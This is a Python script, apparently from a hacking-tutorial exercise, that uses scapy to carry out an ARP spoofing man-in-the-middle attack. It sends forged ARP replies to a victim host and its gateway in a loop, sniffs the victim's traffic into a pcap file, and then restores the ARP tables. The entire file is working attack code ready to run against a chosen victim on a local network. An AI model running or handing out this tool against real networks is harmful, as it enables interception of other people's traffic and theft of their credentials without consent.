from multiprocessing import Process
import sys
import os
import time
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, 
                       send, sniff, sndrcv, srp, wrpcap)

def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op='who-has', pdst=targetip)
    resp, _= srp(packet, timeout=2, retry=10, verbose=False) #_ - not response
    for _, r in resp:
        return r[Ether].src
    return None


class Arper:
    def __init__(self, victim, gateway, interface='eth0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        self.iface = interface
        self.verb = 0

        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}')
        print(f'Victim ({victim}) is at {self.victimmac}')
        print('-'*30)
    
    def run(self): #entry point for attack
        self.poison_thread = Process(target=self.poison) #poison ARP-cash
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff) #analisys trafic
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()  #packege for the victim
        poison_victim.op = 2   #is- at
        poison_victim.psrc = self.gateway
        poison_victim.hwsrc = self.gatewaymac
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'Ip srs: {poison_victim.psrc}')
        print(f'Ip dst:{poison_victim.pdst}')
        print(f'mac dst {poison_victim.hwdst}')
        print(f'mac src {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)

        poison_gateway = ARP()   #poison ARP packet for gateway
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.hwsrc = self.victimmac
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'ip mac dst: {poison_gateway.hwdst}')
        print(f'ip mac src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)
        print(f'Beginning the ARP poison. [CTRL-C to stop]')
        
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)



    def sniff(self, count=100):
        time.sleep(5) 
        print(f'Sniffing {count} packets')
        bpf_buffer = 'ip host %s' % victim
        packets = sniff(count=count, filter=bpf_buffer, iface=self.interface) #Where IP-address victim
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished')


    def restore(self):
        print('Restoring ARP-tables...')
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst= 'ff:ff:ff:ff:ff:ff'),
            count=5
        )
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5
        )


if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()


